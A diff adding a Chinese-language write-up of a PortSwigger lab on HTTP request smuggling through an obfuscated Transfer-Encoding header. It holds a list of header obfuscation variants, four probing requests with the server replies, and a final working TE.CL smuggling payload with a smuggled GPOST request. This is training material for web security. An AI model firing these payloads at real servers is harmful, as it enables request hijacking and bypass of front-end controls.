@@ -285,6 +285,151 @@ P
 
 只能說這招真的很精妙，理解的當下真的是覺得，能想到這個 Bypass 技巧的人類真的是大師～
 
+## Lab: HTTP request smuggling, obfuscating the TE header
+
+| Dimension | Description                                                                                     |
+| --------- | ----------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/request-smuggling#te-te-behavior-obfuscating-the-te-header |
+| Lab       | https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header                |
+
+### 工具包
+
+```
+Transfer-Encoding: xchunked
+
+Transfer-Encoding : chunked
+
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+Transfer-Encoding:[tab]chunked
+
+[space]Transfer-Encoding: chunked
+
+X: X[\n]Transfer-Encoding: chunked
+
+Transfer-Encoding
+: chunked
+```
+
+### 1. 嘗試 CL 正確，TE 沒有 `\r\n` 結尾
+
+```
+POST / HTTP/1.1
+Host: 0ac100c303dc801697f00cbc00a20062.web-security-academy.net
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+Content-Length: 1
+
+0
+```
+
+回傳
+
+```
+HTTP/1.1 400 Bad Request
+Content-Type: application/json; charset=utf-8
+X-Content-Type-Options: nosniff
+Connection: close
+Content-Length: 24
+
+{"error":"Read timeout"}
+```
+
+### 2. 嘗試 CL 正確，TE 在 `\r\n` 之後多塞一個 X
+
+```
+POST / HTTP/1.1
+Host: 0ac100c303dc801697f00cbc00a20062.web-security-academy.net
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+Content-Length: 6
+
+0
+
+X
+```
+
+回傳
+
+```
+HTTP/1.1 500 Internal Server Error
+Content-Type: text/html; charset=utf-8
+Connection: close
+Content-Length: 125
+
+<html><head><title>Server Error: Proxy error</title></head><body><h1>Server Error: Communication timed out</h1></body></html>
+```
+
+### 3. 嘗試 CL > 實際傳輸，TE 正確
+
+```
+POST / HTTP/1.1
+Host: 0ac100c303dc801697f00cbc00a20062.web-security-academy.net
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+Content-Length: 10
+
+0
+
+
+```
+
+回傳
+
+```
+HTTP/1.1 500 Internal Server Error
+Content-Type: text/html; charset=utf-8
+Connection: close
+Content-Length: 125
+
+<html><head><title>Server Error: Proxy error</title></head><body><h1>Server Error: Communication timed out</h1></body></html>
+```
+
+### 4. 嘗試 CL < 實際傳輸，TE 正確
+
+```
+POST / HTTP/1.1
+Host: 0ac100c303dc801697f00cbc00a20062.web-security-academy.net
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+Content-Length: 1
+
+0
+
+
+```
+
+正常回傳 200，如果 Frontend 是 CL 的話，那就不會把 `\r\n` 傳給 Backend，Backend 用 TE 就會等到 timeout => 但既然回傳 200，代表 Frontend 是用 TE，BE 是用 CL，並且會累積 `\r\n\r\n` 為 unprocessed
+
+故判斷此情境為 TE.CL，回頭看
+
+- [嘗試 1](#1-嘗試-cl-正確te-沒有-rn-結尾)，Frontend 瘋狂等 `\r\n` 等到 Read timeout => 合理
+- [嘗試 2](#2-嘗試-cl-正確te-在-rn-之後多塞一個-x)，Frontend 把 `0\r\n` 傳給 Backend，Backend 用 CL 等到天荒地老，Frontend 由於收不到 Backend 的回應，回傳 Communication timed out => 合理
+- [嘗試 3](#3-嘗試-cl--實際傳輸te-正確)，Frontend 把 `0\r\n` 傳給 Backend，Backend 用 CL 等到天荒地老，Frontend 由於收不到 Backend 的回應，回傳 Communication timed out => 合理
+
+之後就用 [Lab: HTTP request smuggling, basic CL.TE vulnerability](#lab-http-request-smuggling-basic-clte-vulnerability) 的解法
+
+```
+POST / HTTP/1.1
+Host: 0ac100c303dc801697f00cbc00a20062.web-security-academy.net
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+Content-Length: 4
+
+74
+GPOST / HTTP/1.1
+Host: 0ac100c303dc801697f00cbc00a20062.web-security-academy.net
+Content-Length: 19
+
+Only11Bytes
+0
+
+
+```
+
+發送兩次，成功解題～
+
 ## 參考資料
 
 - https://portswigger.net/web-security/request-smuggling
